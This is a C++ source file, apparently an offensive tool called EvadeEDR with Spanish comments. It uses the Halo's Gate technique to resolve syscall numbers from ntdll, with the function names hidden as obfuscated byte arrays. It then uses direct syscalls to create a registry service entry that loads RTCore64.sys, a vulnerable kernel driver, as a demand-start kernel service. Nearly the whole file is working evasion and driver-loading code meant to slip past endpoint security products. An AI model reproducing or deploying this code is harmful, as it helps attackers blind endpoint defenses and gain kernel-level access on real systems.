// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>

#include "DefsModule.h"

#define PATH_DLL "C:\\Windows\\System32\\ntdll.dll"

/*
* 
* Ahora introduciremos el halo's gate
* 
*/

extern "C" {

    EXTERN_C PVOID getntdll();

    EXTERN_C PVOID getExportTable(
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExAddressTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExNamePointerTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExOrdinalTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getApiAddr(
        IN DWORD apiNameStringLen,
        IN LPSTR apiNameString,
        IN PVOID moduleAddr,
        IN PVOID ExExAddressTable,
        IN PVOID ExNamePointerTable,
        IN PVOID ExOrdinalTable
    );

    EXTERN_C DWORD findSyscallNumber(
        IN PVOID ntdllApiAddr
    );

    EXTERN_C DWORD halosGate(
        IN PVOID ntdllApiAddr,
        IN WORD index
    );

    EXTERN_C DWORD compExplorer(
        IN PVOID explorerWString
    );


    EXTERN_C WORD halosGateUp(PVOID addr, DWORD index);

    EXTERN_C WORD halosGateDown(PVOID addr, DWORD index);

    EXTERN_C VOID SetCall(WORD CallValue);
    EXTERN_C NTSTATUS CallFunc(...);
}
// =====================================================

typedef struct _funStruct {
    PBYTE name;
    SIZE_T size;
    WORD sysnum;
}funStruct, *pfunStruct;

// =====================================================
#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)


#define LOG_OK(fmt, ...)\
    print("[+] " fmt, ##__VA_ARGS__)

#define LOG_ERROR(fmt, ...)\
    print("[-] " fmt, ##__VA_ARGS__)

#define LOG_WARNING(fmt, ...)\
    print("[!] " fmt, ##__VA_ARGS__)

#define LOG_INFO(fmt, ...)\
    print("[.] " fmt, ##__VA_ARGS__)

// ======================================================

PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}


PVOID ntdllAddr = NULL;

PVOID ntdllExportTable = NULL;

PVOID ntdllExAddrTbl = NULL;

PVOID ntdllExNamePtrTbl = NULL;

PVOID ntdllExOrdinalTbl = NULL;


char letters[] = {
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'
};

// ====================================

/*
BYTE nAllocMem[] = {
    39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};


BYTE nProtectMem[] = {
    39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};

BYTE nCreateTh[] = {
    39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23
};
BYTE nWaitObj[] = {
    39, 19, 48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19
};

BYTE nFreeMem[] = {
    39, 19, 31, 17, 4, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};
*/


// NtCreateKey
BYTE nCreateKey[] = {
    39, 19, 28, 17, 4, 0, 19, 4, 36, 4, 24
};

// NtSetValueKey
BYTE nSetKeyVal[] = {
    39, 19, 44, 4, 19, 47, 0, 11, 20, 4, 36, 4, 24
};


// =====================================

/*
* Valores que se ocupan configurar
* Type          (REG_DWORD)
* Start         (REG_DWORD)
* ImagePath     (REG_SZ)
* ErrorControl  (REG_DWORD)
*/

// =====================================

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString == nullptr) {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = nullptr;
    }
    else {
        size_t size = wcslen(SourceString) * sizeof(WCHAR);
        DestinationString->Length = static_cast<USHORT>(size);
        DestinationString->MaximumLength = static_cast<USHORT>(size + sizeof(WCHAR));
        DestinationString->Buffer = const_cast<PWSTR>(SourceString);
    }
}

// =====================================
VOID getWord(char* dst, PBYTE clave, SIZE_T size)
{
    for (size_t i = 0; i < size; i++)
    {
        dst[i] = letters[clave[i]];
    }
}

BOOL init_program()
{

    ntdllAddr = getntdll();

    if (!ntdllAddr)
    {
        LOG_ERROR("Direccion no encontrada ntdllAddr");
        return FALSE;
    }

    ntdllExportTable = getExportTable(ntdllAddr);

    if (!ntdllExportTable)
    {
        LOG_ERROR("Direccion no encontrada ntdllExportTable");
        return FALSE;
    }

    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdllAddr);

    if (!ntdllExAddrTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExAddrTbl");
        return FALSE;
    }

    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdllAddr);

    if (!ntdllExNamePtrTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExNamePtrTbl");
        return FALSE;
    }

    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdllAddr);


    if (!ntdllExOrdinalTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExOrdinalTbl");
        return FALSE;
    }

    return TRUE;
}

BOOL get_numSys(pfunStruct structFunction)
{
    if (!ntdllAddr || !ntdllExAddrTbl || !ntdllExNamePtrTbl || !ntdllExOrdinalTbl || !structFunction->name)
    {
        return FALSE;
    }

    size_t strSize = structFunction->size;

    if (strSize > 127)
    {
        LOG_ERROR("El tamano del nombre de la funcion es demasiado grande");
        return FALSE;
    }

    char fn[127] = { 0 };

    for (size_t i = 0; i < strSize; i++)
    {
        fn[i] = letters[structFunction->name[i]];
    }

    LOG_INFO("Funcion a buscar: %s", fn);

    PVOID addr = getApiAddr(
        strSize,
        fn,
        ntdllAddr,
        ntdllExAddrTbl,
        ntdllExNamePtrTbl,
        ntdllExOrdinalTbl
    );

    WORD number = findSyscallNumber(addr);

    if (number)
    {
        LOG_OK("Valor de numerico de %s es %d", fn, number);
        structFunction->sysnum = number;
        return TRUE;
    }

    DWORD index = 0;

    while (number == 0) {
        index++;

        number = halosGateUp(addr, index);

        if (number) {
            number = number - index;
            break;
        }

        number = halosGateDown(addr, index);

        if (number) {
            number = number + index;
            break;
        }
    }

    LOG_OK("Valor de numerico de %s es %d", fn, number);
    structFunction->sysnum = number;

    return TRUE;
}

// Entry Point
int main()
{
    
    LOG_INFO("Comenzando Halo's Gate...");

    if (!init_program())
    {
        return -1;
    }

    NTSTATUS status = 0;

    // NtCreateKey
    funStruct sCreateKey;
    sCreateKey.name = nCreateKey;
    sCreateKey.size = sizeof(nCreateKey);

    if (!get_numSys(&sCreateKey)) {
        return -1;
    }

    // ===========================================

    HANDLE hKey; // Key 

    ULONG disposition = 0;

    const WCHAR registryPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\AAA";

    UNICODE_STRING keyName;

    keyName.Buffer = (PWSTR)registryPath;

    keyName.Length = sizeof(registryPath) - sizeof(WCHAR);

    keyName.MaximumLength = sizeof(registryPath);

    // Attributes ======
    
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(
        &objAttr,
        &keyName,                // Ruta de la clave en formato NT
        OBJ_CASE_INSENSITIVE,    // El registro no distingue mayúsculas/minúsculas
        NULL,                    // No se usa con rutas absolutas
        NULL                     // No se requiere descriptor de seguridad aquí
    );

    // ==========================================================

    SetCall(sCreateKey.sysnum);

    status = CallFunc(
        &hKey,
        KEY_ALL_ACCESS, 
        &objAttr,
        0, 
        NULL,
        REG_OPTION_NON_VOLATILE,
        &disposition
    );

    if (status != 0)
    {
        LOG_ERROR("No se pudo crear la llave. E: %d", status);

        return -1;
    }

    if (disposition == REG_CREATED_NEW_KEY)
    {
        LOG_OK("Llave creada exitosamente");
    }
    else if(disposition == REG_OPENED_EXISTING_KEY)
    {
        LOG_INFO("Clave ya creada, se ha abierto");
    }

    // ======= Ahora toca modificar los valores ======

    funStruct sSetKeyVal;
    sSetKeyVal.name = nSetKeyVal;
    sSetKeyVal.size = sizeof(nSetKeyVal);

    if (!get_numSys(&sSetKeyVal))
    {
        CloseHandle(hKey);
        return -1;
    }

    // ===================================================

    UNICODE_STRING uImagePathName;
    UNICODE_STRING uTypeName;
    UNICODE_STRING uStartName;
    UNICODE_STRING uErrorControlName;

    RtlInitUnicodeString(&uImagePathName, L"ImagePath");
    RtlInitUnicodeString(&uTypeName, L"Type");
    RtlInitUnicodeString(&uStartName, L"Start");
    RtlInitUnicodeString(&uErrorControlName, L"ErrorControl");

    // =======================================================

    WCHAR imagePath[] = L"\\??\\C:\\test\\RTCore64.sys";
    DWORD dataType = REG_SZ;
    ULONG dataSize = sizeof(imagePath);  // ya incluye el NULL terminator

    SetCall(sSetKeyVal.sysnum);
    status = CallFunc(
        hKey,
        &uImagePathName,
        0,
        dataType,
        (PVOID)imagePath,
        dataSize
    );


    if (status != 0) {
        LOG_ERROR("Error al escribir ImagePath: %08x", status);
        CloseHandle(hKey);
        return -1;
    }



    DWORD typeVal = SERVICE_KERNEL_DRIVER;   
    dataType = REG_DWORD;
    dataSize = sizeof(DWORD);
    SetCall(sSetKeyVal.sysnum);
    status = CallFunc(
        hKey,
        &uTypeName,
        0,
        dataType,
        (PVOID)&typeVal,
        dataSize
    );

    if(status != 0) {
        LOG_ERROR("Error al escribir type: %08x", status);
        CloseHandle(hKey);
        return -1;
    }


    DWORD startVal = SERVICE_DEMAND_START;   
    SetCall(sSetKeyVal.sysnum);
    status = CallFunc(
        hKey,
        &uStartName,
        0,
        REG_DWORD,
        (PVOID)&startVal,
        sizeof(DWORD)
    );


    if(status != 0) {
        LOG_ERROR("Error al escribir startVal: %08x", status);
        CloseHandle(hKey);
        return -1;
    }


    DWORD errorCtrlVal = SERVICE_ERROR_NORMAL;   
    SetCall(sSetKeyVal.sysnum);
    status = CallFunc(
        hKey,
        &uErrorControlName,
        0,
        REG_DWORD,
        (PVOID)&errorCtrlVal,
        sizeof(DWORD)
    );


    if (status != 0) {
        LOG_ERROR("Error al escribir errorCtrlService: %08x", status);
        CloseHandle(hKey);
        return -1;
    }


    LOG_OK("Se escribio por completo el Servicio");

    CloseHandle(hKey);

    return 0;

}